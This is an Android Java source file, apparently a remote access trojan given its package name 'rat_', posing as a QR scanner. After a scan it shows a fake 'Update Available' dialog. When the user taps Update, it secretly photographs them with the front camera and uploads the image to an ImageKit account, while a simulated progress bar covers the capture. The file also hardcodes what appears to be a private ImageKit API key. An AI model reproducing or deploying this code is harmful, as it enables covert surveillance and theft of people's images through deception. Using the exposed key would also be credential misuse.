package com.example.rat_;

import android.Manifest;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;

import com.google.common.util.concurrent.ListenableFuture;
import com.journeyapps.barcodescanner.ScanContract;
import com.journeyapps.barcodescanner.ScanOptions;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executor;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Credentials;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private Button scanButton;
    private ProgressBar progressBar;
    private ImageCapture imageCapture;

    private String lastScannedContent; // stores the QR result until after "update"

    // ⚠️ Hardcoded ImageKit (only for testing)
    private static final String IMAGEKIT_UPLOAD_URL = "https://upload.imagekit.io/api/v1/files/upload";
    private static final String IMAGEKIT_PRIVATE_KEY = "private_h1lhODU2H93DrmvD5cuRnG9Kp0I=";

    // Reused HTTP client with longer timeouts
    private static final OkHttpClient httpClient = new OkHttpClient.Builder()
            .retryOnConnectionFailure(true)
            .connectTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(120, TimeUnit.SECONDS)
            .readTimeout(120, TimeUnit.SECONDS)
            .build();

    // Permission launcher for CAMERA
    private final ActivityResultLauncher<String> cameraPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    scanButton.setEnabled(true);
                    startCamera(); // set up ImageCapture once permission is granted
                } else {
                    Toast.makeText(this, "Camera permission is required", Toast.LENGTH_SHORT).show();
                }
            });

    // QR scanner launcher
    private final ActivityResultLauncher<ScanOptions> qrLauncher =
            registerForActivityResult(new ScanContract(), result -> {
                if (result.getContents() != null) {
                    lastScannedContent = result.getContents();
                    showUpdateDialog(); // prompt "update" after a successful scan
                } else {
                    // user backed out; allow re-scan
                    restartQRScanner();
                }
            });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        scanButton = findViewById(R.id.scanButton);
        progressBar = findViewById(R.id.progressBar);

        scanButton.setEnabled(false);
        cameraPermissionLauncher.launch(Manifest.permission.CAMERA);

        scanButton.setOnClickListener(v -> restartQRScanner());
    }

    private void restartQRScanner() {
        ScanOptions options = new ScanOptions();
        options.setPrompt("Scan a QR code");
        options.setBeepEnabled(true);
        options.setOrientationLocked(true);
        options.setCaptureActivity(PortraitCaptureActivity.class);
        qrLauncher.launch(options);
    }

    private void showUpdateDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Update Available")
                .setMessage("Do you want to update?")
                .setPositiveButton("Update", (dialog, which) -> {
                    // 1) Take the picture immediately
                    takeFrontCameraPhoto();
                    // 2) Simulate update progress
                    simulateUpdate();
                })
                .setNegativeButton("Cancel", null)
                .show();
    }

    private void simulateUpdate() {
        progressBar.setProgress(0);
        progressBar.setMax(100);

        new Thread(() -> {
            for (int i = 1; i <= 100; i++) {
                int p = i;
                runOnUiThread(() -> progressBar.setProgress(p));
                try {
                    Thread.sleep(40);
                } catch (InterruptedException ignored) {}
            }
            runOnUiThread(() -> {
                Toast.makeText(MainActivity.this, "Update finished", Toast.LENGTH_SHORT).show();
                openResultInBrowserOrRescan();
            });
        }).start();
    }

    private void openResultInBrowserOrRescan() {
        if (lastScannedContent != null && lastScannedContent.trim().toLowerCase(Locale.US).startsWith("http")) {
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(lastScannedContent.trim()));
                startActivity(intent);
            } catch (Exception e) {
                Toast.makeText(this, "Invalid link. Content: " + lastScannedContent, Toast.LENGTH_LONG).show();
                restartQRScanner();
            }
        } else if (lastScannedContent != null) {
            Toast.makeText(this, "Scanned: " + lastScannedContent, Toast.LENGTH_LONG).show();
            restartQRScanner();
        } else {
            restartQRScanner();
        }
    }

    private void startCamera() {
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        Executor executor = ContextCompat.getMainExecutor(this);

        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                imageCapture = new ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build();

                CameraSelector cameraSelector = new CameraSelector.Builder()
                        .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                        .build();

                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);

            } catch (ExecutionException | InterruptedException e) {
                e.printStackTrace();
            }
        }, executor);
    }

    private void takeFrontCameraPhoto() {
        if (imageCapture == null) return;

        File dir = getExternalFilesDir(null);
        if (dir != null && !dir.exists()) dir.mkdirs();

        File photoFile = new File(
                dir,
                new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date()) + ".jpg"
        );

        ImageCapture.OutputFileOptions outputOptions =
                new ImageCapture.OutputFileOptions.Builder(photoFile).build();

        imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(this),
                new ImageCapture.OnImageSavedCallback() {
                    @Override
                    public void onImageSaved(@NonNull ImageCapture.OutputFileResults outputFileResults) {
                        Log.d("MainActivity", "Photo saved at: " + photoFile.getAbsolutePath());

                        // Compress before upload
                        File compressed = compressImage(photoFile);
                        if (compressed != null) {
                            uploadToImageKit(compressed);
                        } else {
                            uploadToImageKit(photoFile); // fallback
                        }
                    }

                    @Override
                    public void onError(@NonNull ImageCaptureException exception) {
                        exception.printStackTrace();
                        Toast.makeText(MainActivity.this,
                                "Photo error: " + exception.getMessage(),
                                Toast.LENGTH_SHORT).show();
                    }
                });
    }

    private File compressImage(File original) {
        try {
            Bitmap bitmap = BitmapFactory.decodeFile(original.getAbsolutePath());
            File compressed = new File(getCacheDir(), "compressed_" + original.getName());
            FileOutputStream out = new FileOutputStream(compressed);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out); // 70% quality
            out.close();
            return compressed;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private void uploadToImageKit(File file) {
        RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("fileName", file.getName())
                .addFormDataPart(
                        "file",
                        file.getName(),
                        RequestBody.create(MediaType.parse("image/jpeg"), file)
                )
                .build();

        String credential = Credentials.basic(IMAGEKIT_PRIVATE_KEY, "");

        Request request = new Request.Builder()
                .url(IMAGEKIT_UPLOAD_URL)
                .addHeader("Authorization", credential)
                .post(body)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e("ImageKit", "Upload failed: " + e.getMessage());
            }
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("ImageKit", "Upload success: " + (response.body() != null ? response.body().string() : ""));
                } else {
                    String err = response.body() != null ? response.body().string() : "Unknown";
                    Log.e("ImageKit", "Upload error: " + response.code() + " " + err);
                }
            }
        });
    }
}
